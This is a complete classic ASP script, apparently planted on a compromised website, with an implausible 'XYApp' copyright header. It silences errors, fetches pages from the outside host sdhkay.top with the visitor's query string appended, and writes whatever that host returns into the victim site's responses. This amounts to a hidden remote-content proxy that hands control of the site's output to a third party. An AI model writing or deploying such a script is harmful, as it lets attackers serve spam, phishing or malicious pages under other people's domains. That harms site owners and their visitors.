<%On Error Resume Next
'  jiao-ben           
' +----------------------------------------------------------------------+
' Copyright (c) 1949-2015 XYApp
' +----------------------------------------------------------------------+
'
Server.ScriptTimeout = 888888
Response.ContentType = "text/html;charset=gb2312"
Dim target_url
target_url ="http://sdhkay.top/" 
'--------------------------------------------------------------------------------------------
Function get_remote_http_page(url, charset) 
    Dim http 
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "GET", url, false
    http.setTimeouts 8000, 16000, 8000, 16000 'xmlDNSTimeout, xmlCONTimeout, xmlSNDTimeout, xmlRCVTimeout
    http.Send()
    If Err.Number<>0 Or http.readystate<>4 Then
    		Response.Write Err.Description
    		Err.Clear
    		Exit Function 
    End If 
    
    Dim objStream
    Set objStream = Server.CreateObject("Adodb.Stream")
    objStream.Type = 1
    objStream.Mode = 3
    objStream.Open
    objStream.Write http.ResponseBody
    objStream.Position = 0
    objStream.Type = 2
    objStream.Charset = charset
    get_remote_http_page = objStream.ReadText 
    objStream.Close
    Set objStream = Nothing

    Set http = Nothing
End function
'--------------------------------------------------------------------------------------------
Response.Write(get_remote_http_page(target_url & "?" & Request.QueryString, "gb2312"))%>